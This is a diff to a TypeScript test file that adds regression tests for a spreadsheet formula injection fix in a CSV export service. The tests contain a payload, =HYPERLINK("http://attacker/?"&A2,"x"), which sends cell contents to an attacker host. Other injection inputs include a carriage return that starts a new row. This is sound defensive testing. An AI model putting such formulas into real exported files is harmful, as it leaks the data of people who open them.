@@ -26,7 +26,10 @@ import * as fsp from 'node:fs/promises';
 import * as os from 'node:os';
 import * as path from 'node:path';
 import * as unzipper from 'unzipper';
+import * as csv from 'csv-writer';
+import * as csvParser from 'csv-parser';
 import { ExportRedacted } from '../export-redact.decorator';
+import { fromSpreadsheetSafeCsvRow } from '../spreadsheet-safe-row';
 import { ExportService, IExportJob } from './export.service';
 
 const requestStore = new AsyncLocalStorage<{ tenantId: string }>();
@@ -257,9 +260,12 @@ describe('ExportService', () => {
 			const { job, archive } = await runExport(service, TENANT_A);
 			jobs.push(job);
 
+			// Every field is quoted since GHSA-7xp5-j564-4752 (see `csvWriter`), so the cell text is read
+			// back through the quotes here.
+			const unquote = (field: string) => field.replace(/^"|"$/g, '').replace(/""/g, '"');
 			const [header, ...rows] = archive.trim().split(/\r?\n/);
-			const tokenRow = rows.find((row) => row.startsWith('row-a-token'));
-			const flagRow = rows.find((row) => row.startsWith('row-a-flag'));
+			const tokenRow = rows.find((row) => unquote(row).startsWith('row-a-token'));
+			const flagRow = rows.find((row) => unquote(row).startsWith('row-a-flag'));
 
 			// The credential is gone …
 			expect(archive).not.toContain('tenant-a-secret-access-token-0123456789');
@@ -267,7 +273,7 @@ describe('ExportService', () => {
 			expect(tokenRow).toContain('*'.repeat(35));
 
 			// … but the column is still there, and the non-secret columns are untouched.
-			expect(header.split(',')).toEqual(SETTING_COLUMNS);
+			expect(header.split(',').map(unquote)).toEqual(SETTING_COLUMNS);
 			expect(tokenRow).toContain('access_token');
 			expect(flagRow).toContain('isEnabled');
 			expect(flagRow).toContain('true');
@@ -365,6 +371,114 @@ describe('ExportService', () => {
 			).rejects.toThrow(TypeError);
 
 			expect(fs.existsSync(path.join(job.csvDir, 'mystery.csv'))).toBe(false);
+		});
+	});
+	describe('spreadsheet formula injection (GHSA-7xp5-j564-4752)', () => {
+		const PAYLOAD = '=HYPERLINK("http://attacker/?"&A2,"x")';
+
+		/** The pre-fix writer: plain `csv-writer` defaults, values written as they were stored. */
+		async function writeUnescaped(job: IExportJob, filename: string, items: Record<string, unknown>[]) {
+			const writer = csv.createObjectCsvWriter({
+				path: path.join(job.csvDir, `${filename}.csv`),
+				header: Object.keys(items[0]).map((key) => ({ id: key, title: key }))
+			});
+			await writer.writeRecords(items);
+		}
+
+		/** Reads a CSV back the way `ImportService` does. */
+		function parse(csvPath: string, unescape = true): Promise<Record<string, string>[]> {
+			return new Promise((resolve, reject) => {
+				const rows: Record<string, string>[] = [];
+				fs.createReadStream(csvPath, 'utf8')
+					.pipe(csvParser())
+					.on('data', (row: Record<string, string>) =>
+						rows.push(unescape ? fromSpreadsheetSafeCsvRow(row) : row)
+					)
+					.on('error', reject)
+					.on('end', () => resolve(rows));
+			});
+		}
+
+		it('writes a stored formula as text, while an ordinary value and a number are untouched', async () => {
+			const job = await service.createExportJob();
+			jobs.push(job);
+
+			const row = { id: 'row-1', name: PAYLOAD, owner: 'Ada Lovelace', rate: '-12.50' };
+
+			// CONTROL: the pre-fix writer put the payload into the cell verbatim, so the spreadsheet
+			// evaluates it on open.
+			await writeUnescaped(job, 'tag_before', [row]);
+			const [before] = await parse(path.join(job.csvDir, 'tag_before.csv'), false);
+			expect(before.name).toBe(PAYLOAD);
+			expect(before.name.startsWith('=')).toBe(true);
+
+			await service.csvWriter(job, 'tag', [row]);
+			const [after] = await parse(path.join(job.csvDir, 'tag.csv'), false);
+			expect(after.name).toBe(`'${PAYLOAD}`);
+			expect(after.owner).toBe('Ada Lovelace');
+			// A numeric string stays a number for the reader.
+			expect(after.rate).toBe('-12.50');
+		});
+
+		it('escapes an array column, which `csv-writer` turns into cell text', async () => {
+			const job = await service.createExportJob();
+			jobs.push(job);
+
+			const row = { id: 'row-1', tags: ['=1+1', 'b'] };
+
+			// CONTROL: `String(['=1+1','b'])` is `=1+1,b`, a formula in the first cell.
+			await writeUnescaped(job, 'view_before', [row]);
+			const [before] = await parse(path.join(job.csvDir, 'view_before.csv'), false);
+			expect(before.tags).toBe('=1+1,b');
+
+			await service.csvWriter(job, 'view', [row]);
+			const [after] = await parse(path.join(job.csvDir, 'view.csv'), false);
+			expect(after.tags).toBe("'=1+1,b");
+		});
+
+		it('quotes every field, so a bare CR cannot start a new spreadsheet row', async () => {
+			const job = await service.createExportJob();
+			jobs.push(job);
+
+			// No comma, no newline and no quote in the value, so `csv-writer`'s default stringifier has
+			// no reason of its own to quote the field.
+			const row = { id: 'row-1', note: 'Acme\r=1+1' };
+
+			// CONTROL: no comma, no newline, no quote in front of the CR, so the pre-fix writer left the
+			// field bare and Excel/LibreOffice read the CR as a row break — a formula cell of its own.
+			await writeUnescaped(job, 'note_before', [row]);
+			const before = fs.readFileSync(path.join(job.csvDir, 'note_before.csv'), 'utf8');
+			expect(before).toContain(',Acme\r=1+1');
+
+			await service.csvWriter(job, 'note', [row]);
+			const after = fs.readFileSync(path.join(job.csvDir, 'note.csv'), 'utf8');
+			expect(after).toContain('"Acme\r=1+1"');
+			expect(after).not.toContain(',Acme\r');
+		});
+
+		it('round-trips export → import byte for byte', async () => {
+			const job = await service.createExportJob();
+			jobs.push(job);
+
+			const row = {
+				id: 'row-1',
+				formula: '=1+1',
+				plus: '+1+1',
+				minus: '-1+1',
+				at: '@SUM(A1)',
+				tab: '\t=1+1',
+				fullWidth: '\uFF1D1+1',
+				quoted: "'Twas brillig",
+				numeric: '-12.50',
+				plain: 'Ada Lovelace',
+				comma: 'a,b',
+				quote: 'say "hi"'
+			};
+
+			await service.csvWriter(job, 'round_trip', [row]);
+			const [parsed] = await parse(path.join(job.csvDir, 'round_trip.csv'));
+
+			expect(parsed).toEqual(row);
 		});
 	});
 });
